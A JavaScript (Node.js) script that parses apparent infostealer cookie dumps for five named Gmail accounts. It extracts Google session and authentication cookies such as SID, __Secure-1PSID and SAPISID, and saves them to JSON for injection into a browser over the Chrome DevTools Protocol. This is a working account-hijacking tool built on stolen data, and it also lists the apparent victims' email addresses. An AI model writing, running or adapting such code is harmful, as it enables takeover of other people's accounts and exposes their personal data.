import { WebSocket } from 'ws';
import fs from 'node:fs';
import http from 'node:http';
import { execSync } from 'node:child_process';

const CDP = 'http://127.0.0.1:9222';
const DUMP = '/Volumes/Untitled/cookies/data/0806';

// BD accounts → cookie file mapping
const ACCOUNTS = [
  { email: 'varienlexor@gmail.com', dir: '39530155', file: 'Cookies/Google Chrome_Profile 48.txt' },
  { email: 'the.benoskar@gmail.com', dir: '39530155', file: 'Cookies/Google Chrome_Profile 11.txt' },
  { email: 'official.theomilan@gmail.com', dir: '39530155', file: 'Cookies/Google Chrome_Profile 49.txt' },
  { email: 'hkofficial.bd33@gmail.com', dir: '88056847', file: 'Cookies/Google Chrome_Profile 8.txt' },
  { email: 'imnoob908@gmail.com', dir: '05229711', file: 'Cookies/Cookies_Chrome_Default.txt' },
];

// Key Google auth cookies to extract
const AUTH_COOKIES = [
  'SID', 'HSID', 'SSID', 'APISID', 'SAPISID',
  '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID',
  'LSID', 'OSID', 'SIDCC', '__Host-1PLSID', '__Host-3PLSID',
  'ACCOUNT_CHOOSER', 'SMSV', 'OGPC', 'NID', 'CONSENT', 'SOCS',
  'OTZ', 'DV', 'SEARCH_SAMESITE',
];

function parseCookieLine(line) {
  // Format: domain SECURE path OTHER expiry name value
  const parts = line.split('\t');
  if (parts.length < 7) return null;
  return {
    domain: parts[0],
    secure: parts[1] === 'TRUE',
    path: parts[2],
    httpOnly: parts[3] === 'TRUE',  // guessed field
    expiry: parseInt(parts[4]),
    name: parts[5],
    value: parts.slice(6).join('\t'), // value may contain tabs
  };
}

function extractGoogleCookies(filePath) {
  const content = fs.readFileSync(filePath, 'utf8');
  const lines = content.split('\n');
  const cookies = [];
  const authNames = new Set(AUTH_COOKIES.map(c => c.toLowerCase()));

  for (const line of lines) {
    if (!line.trim()) continue;
    const c = parseCookieLine(line);
    if (!c) continue;
    // Check if it's a Google domain
    if (!c.domain.includes('google.com')) continue;
    // Check if it's an auth cookie
    if (AUTH_COOKIES.includes(c.name) || authNames.has(c.name.toLowerCase())) {
      cookies.push(c);
    }
  }
  return cookies;
}

// Extract for each account
for (const acct of ACCOUNTS) {
  const path = `${DUMP}/[BD]_@FATETRAFFIC_2026_08_02_${acct.dir}/${acct.file}`;
  try {
    const cookies = extractGoogleCookies(path);
    acct.cookies = cookies;
    const names = cookies.map(c => c.name).join(', ');
    console.log(`${acct.email}: ${cookies.length} auth cookies → ${names || '(none)'}`);
    // check SID presence (key auth cookie)
    const hasSid = cookies.find(c => c.name === 'SID' || c.name === '__Secure-1PSID');
    console.log(`  SID/1PSID: ${hasSid ? `✅ ${hasSid.name}=${hasSid.value.slice(0,20)}...${hasSid.value.slice(-10)}` : '❌ MISSING'}`);
  } catch(e) {
    console.log(`${acct.email}: ERROR ${e.message}`);
    acct.cookies = [];
  }
}

// Save to JSON for CDP injection
const out = ACCOUNTS.map(a => ({ email: a.email, cookies: a.cookies }));
fs.writeFileSync('/tmp/bd_google_cookies.json', JSON.stringify(out, null, 2));
console.log('\nSaved to /tmp/bd_google_cookies.json');
